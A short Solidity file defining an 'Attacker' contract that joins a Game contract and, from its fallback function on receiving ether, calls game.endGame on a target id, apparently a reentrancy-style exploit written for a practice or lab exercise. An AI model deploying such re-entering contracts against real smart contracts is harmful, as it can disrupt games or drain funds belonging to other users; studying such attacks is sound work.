// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.18;


import "./Game.sol";


contract Attacker {
    Game public game;
    uint targetId;
    address owner;


    event Test(uint256 test1, address test2);

    constructor(Game _game, uint _targetId) {
        game = Game(_game);
        targetId = _targetId;
        owner = msg.sender;
    }

    function joinGame(uint _gameId) public payable{
        game.joinGame{value: msg.value}(_gameId);
        emit Test(msg.value, address(game));
    } 

     fallback() external payable{
        emit Test(msg.value, address(game));
         
        
        //(bool success,) = address(game).delegatecall(abi.encodeWithSignature("testEnd()"));
        //require(success, "revert call ...!");
        game.endGame(targetId);
    }

    //withdraw onlyOwner()... 
}


